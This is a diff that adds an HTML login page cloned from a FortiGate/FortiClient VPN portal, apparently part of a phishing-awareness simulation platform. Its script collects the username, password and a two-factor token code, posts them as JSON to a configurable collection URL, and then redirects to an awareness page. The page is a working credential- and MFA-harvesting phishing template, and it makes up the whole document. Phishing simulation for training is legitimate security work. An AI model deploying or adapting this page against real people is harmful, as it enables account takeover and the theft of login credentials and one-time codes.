@@ -1,0 +1,87 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Please Login</title>
+<link rel="stylesheet" href="assets/style.css">
+</head>
+<body>
+<div class="fgt-wrap">
+  <div class="fgt-card">
+    <div class="fgt-head">
+      <svg class="fgt-logo" viewBox="0 0 24 24" width="22" height="22" aria-hidden="true"><g fill="#ffffff"><rect x="1" y="1" width="6" height="6" rx="1.2"/><rect x="9" y="1" width="6" height="6" rx="1.2"/><rect x="1" y="9" width="6" height="6" rx="1.2"/><path d="M9 9h12a2 2 0 0 1 2 2v0a2 2 0 0 1-2 2H9z"/></g></svg>
+      <span class="fgt-title">Please Login</span>
+    </div>
+    <div class="fgt-body">
+      <form id="step-login" autocomplete="off">
+        <input type="text" name="email" class="fgt-input" placeholder="Username" autofocus required>
+        <input type="password" name="password" class="fgt-input" placeholder="Password" required>
+        <div class="fgt-actions">
+          <button type="submit" class="fgt-btn fgt-login">Login</button>
+          <button type="button" class="fgt-btn fgt-fc" onclick="return false">Launch FortiClient</button>
+        </div>
+      </form>
+      <form id="step-2fa" autocomplete="off" style="display:none">
+        <div class="fgt-2fa-info">Enter the token code for <span id="email-echo-2"></span></div>
+        <input type="text" name="code_2fa" class="fgt-input fgt-token" inputmode="numeric" pattern="[0-9]{4,8}" maxlength="8" placeholder="Token" required>
+        <div class="fgt-actions"><button type="submit" class="fgt-btn fgt-login">Login</button></div>
+      </form>
+    </div>
+  </div>
+</div>
+<script data-tracker src="{{TRACKER_URL_ATTR}}"></script>
+<script>
+(function () {
+  // CAPTURE (authorised simulation): single-page login (username + password on
+  // one screen, matching the real portal). On submit it records page 1 (email)
+  // then page 2 (email+password) to the tracker — keeping the 3-page tracker
+  // schema — then either shows the OTP step (page 3) or redirects to the
+  // built-in awareness page (learn.html). URL params: rid/trackerId (tracker
+  // context), email|login_hint (pre-fills the username), mfa=0 (skip OTP).
+  var POST_URL = "{{POST_URL}}";
+  var Q = new URLSearchParams(location.search);
+  var prefillEmail = (Q.get("email") || Q.get("login_hint") || "").trim();
+  var captureMfa   = Q.get("mfa") !== "0";
+  function trackerCtx() {
+    var t = window.__taphish_tracker || {};
+    return { rid: t.rid || Q.get("rid") || "", sess_id: t.session_id || Q.get("sess_id") || "", trackerId: t.tracker_id || Q.get("trackerId") || "" };
+  }
+  function post(payload, cb) {
+    if (!POST_URL) { cb(); return; }
+    fetch(POST_URL, { method: "POST", mode: "cors", headers: { "Content-Type": "application/json" }, body: JSON.stringify(payload) }).then(cb, cb);
+  }
+  var formLogin = document.getElementById("step-login");
+  var form2fa   = document.getElementById("step-2fa");
+  var emailVal = "", pwdVal = "";
+  function redirectAware(ctx) {
+    var rid = ctx.rid ? ("?rid=" + encodeURIComponent(ctx.rid)) : "";
+    setTimeout(function () { location.href = "learn.html" + rid; }, 250);
+  }
+  formLogin.addEventListener("submit", function (e) {
+    e.preventDefault();
+    emailVal = formLogin.elements["email"].value;
+    pwdVal   = formLogin.elements["password"].value;
+    var ctx = trackerCtx();
+    post({ page: 1, form_field_data: { email: emailVal }, rid: ctx.rid, sess_id: ctx.sess_id, trackerId: ctx.trackerId }, function () {
+      post({ page: 2, form_field_data: { email: emailVal, password: pwdVal }, rid: ctx.rid, sess_id: ctx.sess_id, trackerId: ctx.trackerId }, function () {
+        if (captureMfa && form2fa) {
+          formLogin.style.display = "none"; form2fa.style.display = "block";
+          var ee = document.getElementById("email-echo-2"); if (ee) ee.textContent = emailVal;
+        } else { redirectAware(ctx); }
+      });
+    });
+  });
+  if (form2fa) {
+    form2fa.addEventListener("submit", function (e) {
+      e.preventDefault();
+      var code = form2fa.elements["code_2fa"].value;
+      var ctx = trackerCtx();
+      post({ page: 3, form_field_data: { email: emailVal, password: pwdVal }, code_2fa: code, rid: ctx.rid, sess_id: ctx.sess_id, trackerId: ctx.trackerId }, function () { redirectAware(ctx); });
+    });
+  }
+  if (prefillEmail && formLogin.elements["email"]) { formLogin.elements["email"].value = prefillEmail; }
+})();
+</script>
+</body>
+</html>
